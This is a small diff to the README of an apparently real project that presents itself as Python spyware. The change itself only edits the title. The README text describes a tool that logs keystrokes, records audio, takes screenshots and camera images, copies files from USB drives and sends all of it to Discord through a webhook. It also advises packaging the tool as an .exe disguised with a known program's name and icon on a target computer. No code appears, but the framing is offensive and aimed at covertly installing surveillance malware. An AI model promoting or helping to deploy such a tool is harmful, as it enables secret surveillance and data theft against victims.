@@ -1,4 +1,4 @@
-# Python spyware with Discord Webhooks v1
+# Python spyware with Discord Webhooks (v1)
 
 The script records audio, captures keystrokes, takes screenshots and camera images, detects connected USB drives to copy targeted files, and sends all these data to Discord via a webhook.
 You need to install the file, putting it in .exe format, using a name and icon from a known program or on the target computer. 
